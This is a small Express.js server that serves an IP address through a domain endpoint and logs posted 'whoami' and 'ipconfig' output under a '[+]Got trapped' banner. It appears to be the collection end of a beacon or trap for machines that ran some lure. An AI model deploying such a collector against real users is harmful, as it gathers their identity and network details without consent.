const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

app.use(bodyParser.urlencoded({
    extended: true
}));
app.use(bodyParser.json());
app.use(express.static('public'));

app.listen(8080, () => {

});

app.post('/', (req, res) => {
    res.send("Thank you for reaching me out.");
});

app.get('/', (req, res) => {
    res.send("Thank you for reaching me out.");
});

app.get('/api/v4/domain', (req, res) => {
    res.send("10.0.2.15");
    //res.send("new-domain.name");
})

app.post('/api/v5/whoami', (req, res) => {
    //console.log(req.body);
    var whoami = req.body.whoami;
    var ipconfig = req.body.ipconfig.replace("\r\n\r\n", "");  // omit a few newlines
    var data = "[+]Got trapped\n\n" + "username: " + whoami + 
                ipconfig + "\n--------------------------------\n"
    fs.appendFile('whoExecuted.txt', data, (err) => {
        if (err) throw err;
    })
    res.send("Thank you for reaching me out.");
});